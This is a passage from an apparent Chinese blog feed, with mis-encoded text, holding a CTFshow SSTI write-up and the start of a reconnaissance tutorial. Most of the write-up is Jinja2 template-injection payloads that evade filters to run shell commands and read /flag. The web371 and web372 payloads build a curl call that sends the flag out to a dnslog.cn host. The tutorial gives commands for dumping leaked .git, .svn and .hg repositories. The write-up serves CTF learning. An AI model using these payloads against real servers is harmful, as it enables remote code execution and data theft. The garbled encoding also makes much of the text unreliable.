a/bï¼‰</span></span><br><span class="line">request.json<span class="comment"># è·å–postä¼ å…¥jsonå‚æ•°ï¼ˆContent-Type: application/jsonï¼‰</span></span><br></pre></td></tr></table></figure><p><code>payload: ?name=&#123;&#123;url_for.__globals__.os.popen(request.cookies.key).read()&#125;&#125;    Cookie: key=cat /flag</code></p><h1 id="web365-è¿‡æ»¤å…³é”®å­—-amp-å•åŒå¼•å·"><a href="#web365-è¿‡æ»¤å…³é”®å­—-amp-å•åŒå¼•å·" class="headerlink" title="web365(è¿‡æ»¤å…³é”®å­—&amp;å•åŒå¼•å·)"></a>web365(è¿‡æ»¤å…³é”®å­—&amp;å•åŒå¼•å·)</h1><p>è¿‡æ»¤äº†å•åŒå¼•å·è¿˜æœ‰args</p><p>ä¸Šé¢˜çš„payloadå¯ä»¥ç›´æ¥ç”¨</p><p><code>payload: ?name=&#123;&#123;url_for.__globals__.os.popen(request.cookies.key).read()&#125;&#125;    Cookie: key=cat /flag</code></p><h1 id="web366-è¿‡æ»¤ä¸­æ‹¬å·ï¼Œä¸‹åˆ’çº¿ï¼Œå•åŒå¼•å·"><a href="#web366-è¿‡æ»¤ä¸­æ‹¬å·ï¼Œä¸‹åˆ’çº¿ï¼Œå•åŒå¼•å·" class="headerlink" title="web366(è¿‡æ»¤ä¸­æ‹¬å·ï¼Œä¸‹åˆ’çº¿ï¼Œå•åŒå¼•å·)"></a>web366(è¿‡æ»¤ä¸­æ‹¬å·ï¼Œä¸‹åˆ’çº¿ï¼Œå•åŒå¼•å·)</h1><p>è¿‡æ»¤äº†ä¸­æ‹¬å·ï¼Œä¸‹åˆ’çº¿ï¼Œå•åŒå¼•å·ç­‰</p><p>å¯ä»¥åˆ©ç”¨è¿‡æ»¤å™¨è¿›è¡Œç»•è¿‡</p><blockquote><p><code>length()</code> è·å–ä¸€ä¸ªåºåˆ—æˆ–è€…å­—å…¸çš„é•¿åº¦å¹¶å°†å…¶è¿”å›</p><p><code>int()</code> å°†å€¼è½¬æ¢ä¸ºintç±»å‹</p><p><code>float()</code> å°†å€¼è½¬æ¢ä¸ºfloatç±»å‹</p><p><code>lower()</code> å°†å­—ç¬¦ä¸²è½¬æ¢ä¸ºå°å†™</p><p><code>upper()</code> å°†å­—ç¬¦ä¸²è½¬æ¢ä¸ºå¤§å†™</p><p><code>reverse()</code> åè½¬å­—ç¬¦ä¸²</p><p><code>replace(value,old,new)</code> å°†valueä¸­çš„oldæ›¿æ¢ä¸ºnew</p><p><code>list()</code> å°†å˜é‡è½¬æ¢ä¸ºåˆ—è¡¨ç±»å‹</p><p><code>string()</code> å°†å˜é‡è½¬æ¢æˆå­—ç¬¦ä¸²ç±»å‹</p><p><code>join()</code> å°†ä¸€ä¸ªåºåˆ—ä¸­çš„å‚æ•°å€¼æ‹¼æ¥æˆå­—ç¬¦ä¸²ï¼Œé€šå¸¸ç”±pytohnå†…ç½®çš„dict()é…åˆä½¿ç”¨</p><p><code>attr()</code> è·å–å¯¹è±¡çš„å±æ€§</p></blockquote><p>æœ¬é¢˜ä½¿ç”¨attrè¿›è¡Œç»•è¿‡</p><p><code>payload: ?name=&#123;&#123;(lipsum|attr(request.values.glo)).os.popen(request.values.pay).read()&#125;&#125;&amp;glo=__globals__&amp;pay=cat /flag</code></p><h1 id="web367-è¿‡æ»¤os"><a href="#web367-è¿‡æ»¤os" class="headerlink" title="web367(è¿‡æ»¤os)"></a>web367(è¿‡æ»¤os)</h1><p>åå¤æµ‹è¯•ï¼Œå‘ç°è¿‡æ»¤äº†os</p><p>åˆ©ç”¨getè·å–osçš„å€¼</p><p> <code>payload: ?name=&#123;&#123;(lipsum|attr(request.values.glo)).get(request.values.o).popen(request.values.pay).read()&#125;&#125;&amp;glo=__globals__&amp;o=os&amp;pay=cat /flag</code></p><h1 id="web368-è¿‡æ»¤"><a href="#web368-è¿‡æ»¤" class="headerlink" title="web368(è¿‡æ»¤{)"></a>web368(è¿‡æ»¤{)</h1><p>å‘ç°è¿‡æ»¤äº†<code>&#123;</code>ï¼Œå¯ä»¥ä½¿ç”¨<code>&#123; %</code></p><p><strong>payload: </strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?name=&#123;% print</span><br><span class="line">(lipsum|attr(request.values.glo)).get(request.values.o).popen(request.values.pay).read()%&#125;&amp;glo=__globals__&amp;o=os&amp;pay=cat /flag</span><br></pre></td></tr></table></figure><h1 id="web369-è¿‡æ»¤request"><a href="#web369-è¿‡æ»¤request" class="headerlink" title="web369(è¿‡æ»¤request)"></a>web369(è¿‡æ»¤request)</h1><p>è¿‡æ»¤äº†<code>request</code></p><p>å¯ä»¥ä½¿ç”¨ä¸€äº›ç‰¹æ®Šçš„æ–¹æ³•è¿›è¡Œç»•è¿‡</p><p>ä»¥<code>__class__</code>ä¸ºä¾‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1. å­—ç¬¦ç¼–ç </span><br><span class="line">2. æœ€ç®€å•æ‹¼æ¥&quot;+&quot;ï¼š&#x27;__cl&#x27;+&#x27;ass__&#x27;</span><br><span class="line">3. ä½¿ç”¨jinja2çš„~è¿›è¡Œæ‹¼æ¥ï¼š&#123;%set a=&quot;__cla&quot;%&#125;&#123;%set b=&quot;ss_&quot;%&#125;&#123;&#123;()a~b&#125;&#125;</span><br><span class="line">4. ä½¿ç”¨è¿‡æ»¤å™¨(reverseåè½¬ã€replaceæ›¿æ¢ã€joinæ‹¼æ¥ç­‰)ï¼š&#123;%set a=&quot;__ssacl__&quot;|reverse%&#125;&#123;&#123;a&#125;&#125;</span><br><span class="line">5. åˆ©ç”¨pythonçš„char()ï¼š&#123;%set chr=url_for.globals__[&#x27;__builtins__&#x27;].chr%&#125;&#123;&#123;&quot;&quot;[chr(95)%2bchr(95)%2bchr(99)%2bchr(108)%2bchr(97)%2bchr(115)%2bchr(115)%2bchr(95)%2bchr(95)]&#125;&#125;</span><br></pre></td></tr></table></figure><p>åˆ©ç”¨è¿‡æ»¤å™¨åŠä¸Šè¿°æ–¹æ³•è‡ªè¡Œæ„é€ </p><p><code>paylaod:</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">?name=&#123;% set po=dict(po=a,p=a)|join%&#125;</span><br><span class="line">&#123;% set a=(()|select|string|list)|attr(po)(24)%&#125;</span><br><span class="line">&#123;% set ini=(a,a,dict(init=a)|join,a,a)|join()%&#125;</span><br><span class="line">&#123;% set glo=(a,a,dict(globals=a)|join,a,a)|join()%&#125;</span><br><span class="line">&#123;% set geti=(a,a,dict(getitem=a)|join,a,a)|join()%&#125;</span><br><span class="line">&#123;% set built=(a,a,dict(builtins=a)|join,a,a)|join()%&#125;</span><br><span class="line">&#123;% set x=(q|attr(ini)|attr(glo)|attr(geti))(built)%&#125;</span><br><span class="line">&#123;% set chr=x.chr%&#125;</span><br><span class="line">&#123;% set file=chr(47)%2bchr(102)%2bchr(108)%2bchr(97)%2bchr(103)%&#125;</span><br><span class="line">&#123;%print(x.open(file).read())%&#125;</span><br></pre></td></tr></table></figure><h1 id="web370-è¿‡æ»¤æ•°å­—"><a href="#web370-è¿‡æ»¤æ•°å­—" class="headerlink" title="web370(è¿‡æ»¤æ•°å­—)"></a>web370(è¿‡æ»¤æ•°å­—)</h1><p>è¿‡æ»¤äº†æ•°å­—ï¼Œå¯ä»¥åˆ©ç”¨countè¿‡æ»¤å™¨ç»•è¿‡æ•°å­—è¿‡æ»¤</p><p><code>payload:</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">?name=&#123;% set c=(dict(e=a)|join|count)%&#125;</span><br><span class="line">&#123;% set cc=(dict(ee=a)|join|count)%&#125;</span><br><span class="line">&#123;% set ccc=(dict(eee=a)|join|count)%&#125;</span><br><span class="line">&#123;% set cccc=(dict(eeee=a)|join|count)%&#125;</span><br><span class="line">&#123;% set ccccccc=(dict(eeeeeee=a)|join|count)%&#125;</span><br><span class="line">&#123;% set cccccccc=(dict(eeeeeeee=a)|join|count)%&#125;</span><br><span class="line">&#123;% set ccccccccc=(dict(eeeeeeeee=a)|join|count)%&#125;</span><br><span class="line">&#123;% set cccccccccc=(dict(eeeeeeeeee=a)|join|count)%&#125;</span><br><span class="line">&#123;% set coun=(cc~cccc)|int%&#125;</span><br><span class="line">&#123;% set po=dict(po=a,p=a)|join%&#125;</span><br><span class="line">&#123;% set a=(()|select|string|list)|attr(po)(coun)%&#125;</span><br><span class="line">&#123;% set ini=(a,a,dict(init=a)|join,a,a)|join()%&#125;</span><br><span class="line">&#123;% set glo=(a,a,dict(globals=a)|join,a,a)|join()%&#125;</span><br><span class="line">&#123;% set geti=(a,a,dict(getitem=a)|join,a,a)|join()%&#125;</span><br><span class="line">&#123;% set built=(a,a,dict(builtins=a)|join,a,a)|join()%&#125;</span><br><span class="line">&#123;% set x=(q|attr(ini)|attr(glo)|attr(geti))(built)%&#125;</span><br><span class="line">&#123;% set chr=x.chr%&#125;</span><br><span class="line">&#123;% set file=chr((cccc~ccccccc)|int)%2bchr((cccccccccc~cc)|int)%2bchr((cccccccccc~cccccccc)|int)%2bchr((ccccccccc~ccccccc)|int)%2bchr((cccccccccc~ccc)|int)%&#125;</span><br><span class="line">&#123;%print(x.open(file).read())%&#125;</span><br></pre></td></tr></table></figure><h1 id="web371-æ— å›æ˜¾"><a href="#web371-æ— å›æ˜¾" class="headerlink" title="web371(æ— å›æ˜¾)"></a>web371(æ— å›æ˜¾)</h1><p>è¿‡æ»¤äº†printï¼Œç”¨åå¼¹shellï¼ˆè¿™é‡Œä½¿ç”¨dnslogå¤–å¸¦ï¼‰</p><p>payloadï¼š</p> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name=&#123;%set a=dict(po=aa,p=aa)|join%&#125;&#123;%set j=dict(eeeeeeeeeeeeeeeeee=a)|join|count%&#125;&#123;%set k=dict(eeeeeeeee=a)|join|count%&#125;&#123;%set l=dict(eeeeeeee=a)|join|count%&#125;&#123;%set n=dict(eeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee=a)|join|count%&#125;&#123;%set m=dict(eeeeeeeeeeeeeeeeeeee=a)|join|count%&#125;&#123;% set b=(lipsum|string|list)|attr(a)(j)%&#125;&#123;%set c=(b,b,dict(glob=cc,als=aa)|join,b,b)|join%&#125;&#123;%set d=(b,b,dict(getit=cc,em=aa)|join,b,b)|join%&#125;&#123;%set e=dict(o=cc,s=aa)|join%&#125;&#123;% set f=(lipsum|string|list)|attr(a)(k)%&#125;&#123;%set g=(((lipsum|attr(c))|attr(d)(e))|string|list)|attr(a)(-l)%&#125;&#123;%set p=((lipsum|attr(c))|string|list)|attr(a)(n)%&#125;&#123;%set q=((lipsum|attr(c))|string|list)|attr(a)(m)%&#125;&#123;%set i=(dict(curl=aa)|join,f,p,dict(cat=a)|join,f,g,dict(flag=aa)|join,p,q,dict(czcoqr=a)|join,q,dict(dnslog=a)|join,q,dict(cn=a)|join)|join%&#125;&#123;%if ((lipsum|attr(c))|attr(d)(e)).popen(i)%&#125;XiLitter&#123;%endif%&#125;</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨æ—¶åªéœ€æ›¿æ¢åŸŸåå³å¯ï¼Œæ‰§è¡Œååˆ·æ–°dnslog</p><h1 id="web372-è¿‡æ»¤count"><a href="#web372-è¿‡æ»¤count" class="headerlink" title="web372(è¿‡æ»¤count)"></a>web372(è¿‡æ»¤count)</h1><p>å¯ä»¥è€ƒè™‘ç”¨lengthä»£æ›¿count</p><p><code>payload:</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name=&#123;%set a=dict(po=aa,p=aa)|join%&#125;&#123;%set j=dict(eeeeeeeeeeeeeeeeee=a)|join|length%&#125;&#123;%set k=dict(eeeeeeeee=a)|join|length%&#125;&#123;%set l=dict(eeeeeeee=a)|join|length%&#125;&#123;%set n=dict(eeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee=a)|join|length%&#125;&#123;%set m=dict(eeeeeeeeeeeeeeeeeeee=a)|join|length%&#125;&#123;% set b=(lipsum|string|list)|attr(a)(j)%&#125;&#123;%set c=(b,b,dict(glob=cc,als=aa)|join,b,b)|join%&#125;&#123;%set d=(b,b,dict(getit=cc,em=aa)|join,b,b)|join%&#125;&#123;%set e=dict(o=cc,s=aa)|join%&#125;&#123;% set f=(lipsum|string|list)|attr(a)(k)%&#125;&#123;%set g=(((lipsum|attr(c))|attr(d)(e))|string|list)|attr(a)(-l)%&#125;&#123;%set p=((lipsum|attr(c))|string|list)|attr(a)(n)%&#125;&#123;%set q=((lipsum|attr(c))|string|list)|attr(a)(m)%&#125;&#123;%set i=(dict(curl=aa)|join,f,p,dict(cat=a)|join,f,g,dict(flag=aa)|join,p,q,dict(owlptl=a)|join,q,dict(dnslog=a)|join,q,dict(cn=a)|join)|join%&#125;&#123;%if ((lipsum|attr(c))|attr(d)(e)).popen(i)%&#125;XiLitter&#123;%endif%&#125;</span><br></pre></td></tr></table></figure><p>æ›´æ–°dnslogæ•°æ®å³å¯</p>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTFSHOW </tag>
            
            <tag> SSTI </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ä¿¡æ¯æœé›†</title>
      <link href="/2023/07/26/%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/"/>
      <url>/2023/07/26/%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/</url>
      
        <content type="html"><![CDATA[<span id="more"></span><h1 id="ä¿¡æ¯æœé›†æ¦‚è¿°åŠåˆ†ç±»"><a href="#ä¿¡æ¯æœé›†æ¦‚è¿°åŠåˆ†ç±»" class="headerlink" title="ä¿¡æ¯æœé›†æ¦‚è¿°åŠåˆ†ç±»"></a>ä¿¡æ¯æœé›†æ¦‚è¿°åŠåˆ†ç±»</h1><h2 id="æœé›†å†…å®¹"><a href="#æœé›†å†…å®¹" class="headerlink" title="æœé›†å†…å®¹"></a>æœé›†å†…å®¹</h2><ul><li>IPåœ°å€ã€å…¬å¸åœ°å€ã€é‚®ä»¶åœ°å€</li><li>åŸŸåä¿¡æ¯ã€ç«¯å£ä¿¡æ¯ã€æ•æ„Ÿä¿¡æ¯ã€ä¸»æœºå­˜æ´»æƒ…å†µ</li><li>è”ç³»ç”µè¯</li><li>ç½‘ç«™æ¶æ„æŠ€æœ¯</li><li>â€¦â€¦</li></ul><h2 id="ä¿¡æ¯æœé›†åˆ†ç±»"><a href="#ä¿¡æ¯æœé›†åˆ†ç±»" class="headerlink" title="ä¿¡æ¯æœé›†åˆ†ç±»"></a>ä¿¡æ¯æœé›†åˆ†ç±»</h2><h3 id="ä¸»åŠ¨ä¿¡æ¯æœé›†"><a href="#ä¸»åŠ¨ä¿¡æ¯æœé›†" class="headerlink" title="ä¸»åŠ¨ä¿¡æ¯æœé›†"></a>ä¸»åŠ¨ä¿¡æ¯æœé›†</h3><p>éœ€è¦ä¸ç›®æ ‡æœºå™¨è¿›è¡Œç›´æ¥äº¤äº’</p><p><strong>ç¼ºç‚¹ï¼š</strong>å®¹æ˜“è¢«ç›®æ ‡æœºå™¨è®°å½•æ“ä½œä¿¡æ¯æˆ–è€…å±è”½</p><p>æ¯”å¦‚ï¼šnmapã€Scapy</p><h3 id="è¢«åŠ¨ä¿¡æ¯æœé›†"><a href="#è¢«åŠ¨ä¿¡æ¯æœé›†" class="headerlink" title="è¢«åŠ¨ä¿¡æ¯æœé›†"></a>è¢«åŠ¨ä¿¡æ¯æœé›†</h3><p>ä¸éœ€è¦ä¸ç›®æ ‡æœºå™¨è¿›è¡Œäº¤äº’ï¼Œä¸»è¦åˆ©ç”¨ç¬¬ä¸‰ç«™ç‚¹æˆ–æ¸ é“æ¥è¿›è¡Œä¿¡æ¯çš„æ”¶é›†</p><p>æ¯”å¦‚ï¼šgoogleã€shodanã€fofa</p><h1 id="æ•æ„Ÿç›®å½•æ³„éœ²"><a href="#æ•æ„Ÿç›®å½•æ³„éœ²" class="headerlink" title="æ•æ„Ÿç›®å½•æ³„éœ²"></a>æ•æ„Ÿç›®å½•æ³„éœ²</h1><h2 id="gitæ³„éœ²"><a href="#gitæ³„éœ²" class="headerlink" title="gitæ³„éœ²"></a>gitæ³„éœ²</h2><p>gitæ˜¯ä¸€ä¸ªä¸»æµçš„åˆ†å¸ƒå¼ç‰ˆæœ¬æ§åˆ¶ç³»ç»Ÿï¼Œå¼€å‘äººå‘˜åœ¨å¼€å‘è¿‡ç¨‹ä¸­ç»å¸¸ä¼šé—å¿˜<code>.git</code>æ–‡ä»¶å¤¹ï¼Œå¯¼è‡´æ”»å‡»è€…å¯ä»¥é€šè¿‡<code>.git</code>æ–‡ä»¶å¤¹ä¸­çš„ä¿¡æ¯è·å–å¼€å‘äººå‘˜æäº¤è¿‡çš„æ‰€æœ‰æºç ï¼Œè¿›è€Œå¯¼è‡´æœåŠ¡å™¨è¢«æ”»å‡»ã€‚</p><blockquote><p>å·¥å…·<a href="https://github.com/denny0223/scrabble">scrabble</a></p><p>ä½¿ç”¨æ–¹æ³•ï¼š<code>./scrabble http://www.example.com</code></p><p>å·¥å…·<a href="https://github.com/WangYiHang/GitHacker">GitHacker</a></p><p>ä½¿ç”¨æ–¹æ³•ï¼š<code>python GitHacker.py http://www.example.com/.git/</code></p></blockquote><h2 id="SVNæ³„éœ²"><a href="#SVNæ³„éœ²" class="headerlink" title="SVNæ³„éœ²"></a>SVNæ³„éœ²</h2><p>SVNæ˜¯æºä»£ç ç‰ˆæœ¬ç®¡ç†è½¯ä»¶ï¼Œé€ æˆSVNæºä»£ç æ¼æ´çš„ä¸»è¦åŸå› æ˜¯ç®¡ç†å‘˜æ“ä½œä¸è§„èŒƒå°†SVNéšè—æ–‡ä»¶å¤¹æš´éœ²äºå¤–ç½‘ç¯å¢ƒï¼Œå¯ä»¥åˆ©ç”¨<code>.svn/entries</code>æˆ–<code>wc.db</code>æ–‡ä»¶è·å–æœåŠ¡å™¨æºç ç­‰ä¿¡æ¯ã€‚</p><blockquote><p>å·¥å…·<a href="https://gitcode.net/mirrors/kost/dvcs-ripper?utm_source=csdn_github_accelerator">dvcs-ripper</a></p><p>ä½¿ç”¨æ–¹æ³•ï¼š<code>./rip-svn.pl -u http://www.example.com/.svn</code></p></blockquote><h2 id="HGæ³„éœ²"><a href="#HGæ³„éœ²" class="headerlink" title="HGæ³„éœ²"></a>HGæ³„éœ²</h2><p>åœ¨åˆå§‹åŒ–é¡¹ç›®æ—¶ï¼ŒHGä¼šåœ¨å½“å‰æ–‡ä»¶å¤¹åˆ›å»ºä¸€ä¸ª<code>.hg</code>éšè—æ–‡ä»¶å¤¹ï¼Œå…¶ä¸­åŒ…å«ä»£ç å’Œåˆ†æ”¯ä¿®æ”¹è®°å½•ç­‰ä¿¡æ¯ã€‚</p><blockquote><p>å·¥å…·<a href="https://gitcode.net/mirrors/kost/dvcs-ripper?utm_source=csdn_github_accelerator">dvcs-ripper</a></p><p>ä½¿ç”¨æ–¹æ³•ï¼š<code>./rip-hg.pl -v -u http://www.example.com/.hg</code></p></blockquote><h2 id="DS-Store-æºç æ³„æ¼"><a href="#DS-Store-æºç æ³„æ¼" class="headerlink" title="DS_Store æºç æ³„æ¼"></a>DS_Store æºç æ³„æ¼</h2><p>åœ¨å‘å¸ƒä»£ç æ—¶ï¼Œæ²¡æœ‰åˆ é™¤æ–‡ä»¶å¤¹ä¸­éšè—çš„<code>.DS_store</code>ï¼Œè¢«å‘ç°åï¼Œè·å–äº†æ•æ„Ÿçš„æ–‡ä»¶åç­‰ä¿¡æ¯ã€‚</p><blockquote><p>å·¥å…·<a href="https://github.com/lijiejie/ds_store_exp">ds_store_exp</a></p><p>ä½¿ç”¨æ–¹æ³•ï¼š<code>python ds_store_exp.py http://www.example.com/.DS_Store</code></p></blockquote><h1 id="æ•æ„Ÿå¤‡ä»½æ–‡ä»¶"><a href="#æ•æ„Ÿå¤‡ä»½æ–‡ä»¶" class="headerlink" title="æ•æ„Ÿå¤‡ä»½æ–‡ä»¶"></a>æ•æ„Ÿå¤‡ä»½æ–‡ä»¶</h1><h2 id="geditå¤‡ä»½æ–‡ä»¶"><a href="#geditå¤‡ä»½æ–‡ä»¶" class="headerlink" title="geditå¤‡ä»½æ–‡ä»¶"></a>geditå¤‡ä»½æ–‡ä»¶</h2><p>åœ¨Linuxä¸‹ï¼Œï¼Œç”¨geditç¼–è¾‘å™¨ä¿å­˜åï¼Œå½“å‰ç›®å½•ä¸‹ä¼šç”Ÿæˆåç¼€ä¸º<code>~</code>çš„æ–‡ä»¶ï¼Œå…¶æ–‡ä»¶å†…å®¹å°±æ˜¯åˆšç¼–è¾‘çš„å†…å®¹ï¼Œé€šè¿‡æµè§ˆå™¨è®¿é—®è¿™ä¸ªå¸¦æœ‰<code>~</code>çš„æ–‡ä»¶ï¼Œä¾¿å¯ä»¥çš„æºä»£ç ã€‚</p><h2 id="vimå¤‡ä»½æ–‡ä»¶"><a href="#vimå¤‡ä»½æ–‡ä»¶" class="headerlink" title="vimå¤‡ä»½æ–‡ä»¶"></a>vimå¤‡ä»½æ–‡ä»¶</h2><p>vimæ˜¯ç›®å‰è¿ç”¨å¾—æœ€å¤šçš„Linuxç¼–è¾‘å™¨ï¼Œå½“ç”¨æˆ·åœ¨ç¼–è¾‘æ–‡ä»¶ä½†æ„å¤–é€€å‡ºæ—¶ï¼ˆå¦‚é€šè¿‡SSHæ¥è¿æ¥æœåŠ¡å™¨æ—¶ï¼Œåœ¨ç”¨vimç¼–è¾‘æ–‡ä»¶çš„è¿‡ç¨‹ä¸­å¯èƒ½é‡åˆ°å› ä¸ºç½‘é€Ÿä¸å¤Ÿå¯¼è‡´çš„å‘½ä»¤è¡Œå¡æ­»è€Œæ„å¤–é€€å‡ºçš„æƒ…å†µï¼‰ï¼Œä¼šåœ¨å½“å‰ç›®å½•ä¸‹ç”Ÿæˆä¸€ä¸ªå¤‡ä»½æ–‡ä»¶ï¼Œæ–‡ä»¶åæ ¼å¼ä¸ºï¼š<code>.æ–‡ä»¶å.swp</code>ï¼Œè¯¥æ–‡ä»¶ç”¨æ¥å¤‡ä»½ç¼“å†²åŒºä¸­çš„å†…å®¹å³å°†é€€å‡ºæ—¶çš„æ–‡ä»¶å†…å®¹ã€‚é’ˆå¯¹SWPå¤‡ä»½æ–‡ä»¶ï¼Œå¯ä»¥ç”¨<code>vim -r</code>å‘½ä»¤æ¢å¤æ–‡ä»¶çš„å†…å®¹ã€‚</p><h2 id="å¸¸è§„æ–‡ä»¶"><a href="#å¸¸è§„æ–‡ä»¶" class="headerlink" title="å¸¸è§„æ–‡ä»¶"></a>å¸¸è§„æ–‡ä»¶</h2><ul><li><code>robots.txt</code>ï¼šè®°å½•ä¸€äº›ç›®å½•å’ŒCMSç‰ˆæœ¬ä¿¡æ¯</li><li><code>readme.md</code>ï¼šè®°å½•CMSç‰ˆæœ¬ä¿¡æ¯ï¼Œæœ‰çš„ç”šè‡³æœ‰Githubåœ°å€</li><li><code>www.zip/rar/tar.gz</code>ï¼šå¾€å¾€æ˜¯ç½‘ç«™çš„æºç å¤‡ä»½</li></ul><h1 id="Shodanæœç´¢å¼•æ“ä½¿ç”¨æ–¹æ³•"><a href="#Shodanæœç´¢å¼•æ“ä½¿ç”¨æ–¹æ³•" class="headerlink" title="Shodanæœç´¢å¼•æ“ä½¿ç”¨æ–¹æ³•"></a>Shodanæœç´¢å¼•æ“ä½¿ç”¨æ–¹æ³•</h1><p><a href="https://www.shodan.io/">https://www.shodan.io/</a></p><h2 id="åŸºæœ¬ç”¨æ³•"><a href="#åŸºæœ¬ç”¨æ³•" class="headerlink" title="åŸºæœ¬ç”¨æ³•"></a>åŸºæœ¬ç”¨æ³•</h2><p>è¿™é‡Œå°±åƒæ˜¯ç”¨å…¶ä»–æœç´¢å¼•æ“ä¸€æ ·ï¼Œåœ¨ä¸»é¡µçš„æœç´¢æ¡†ä¸­è¾“å…¥æƒ³è¦æœç´¢çš„å†…å®¹å³å¯ï¼Œä¾‹å¦‚ä¸‹é¢æœç´¢ â€œgithubâ€ï¼š</p><p><img src="/img/%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/shodan_01.png" alt=""></p><p>ä¸Šå›¾çš„æœç´¢ç»“æœåŒ…å«ä¸¤ä¸ªéƒ¨åˆ†ï¼Œå·¦ä¾§æ˜¯å¤§é‡çš„æ±‡æ€»æ•°æ®åŒ…æ‹¬ï¼š</p><ul><li>TOTAL RESULTS â€“ æœç´¢ç»“æœæ€»æ•°</li><li>TOP COUNTRIES â€“ æ’åé å‰çš„å›½å®¶</li><li>Top Ports â€“ ä½¿ç”¨æœ€å¤šçš„ç«¯å£</li><li>Top organizations â€“ ä½¿ç”¨æœ€å¤šçš„ç»„ç»‡</li><li>Top products â€“ ä½¿ç”¨æœ€å¤šçš„äº§å“åç§°</li><li>Top operating systems â€“ ä½¿ç”¨æœ€å¤šçš„æ“ä½œç³»ç»Ÿ</li></ul><p>éšåï¼Œåœ¨ä¸­é—´çš„ä¸»é¡µé¢æˆ‘ä»¬å¯ä»¥çœ‹åˆ°åŒ…å«å¦‚ä¸‹çš„æœç´¢ç»“æœï¼š</p><ul><li>IP åœ°å€</li><li>ä¸»æœºå</li><li>ISP</li><li>è¯¥æ¡ç›®çš„æ”¶å½•æ—¶é—´</li><li>è¯¥ä¸»æœºä½äºçš„å›½å®¶</li><li>Banner ä¿¡æ¯ã€</li></ul><p>æƒ³è¦äº†è§£æ¯ä¸ªæ¡ç›®çš„å…·ä½“ä¿¡æ¯ï¼Œåªéœ€è¦ç‚¹å‡»æ¯ä¸ªæ¡ç›®çš„IPåœ°å€æ¥æŸ¥çœ‹è¯¦ç»†ä¿¡æ¯ã€‚</p><h2 id="ä½¿ç”¨æœç´¢è¿‡æ»¤"><a href="#ä½¿ç”¨æœç´¢è¿‡æ»¤" class="headerlink" title="ä½¿ç”¨æœç´¢è¿‡æ»¤"></a>ä½¿ç”¨æœç´¢è¿‡æ»¤</h2><p>ä½¿ç”¨æœç´¢è¿‡æ»¤ï¼Œèƒ½æ›´åŠ 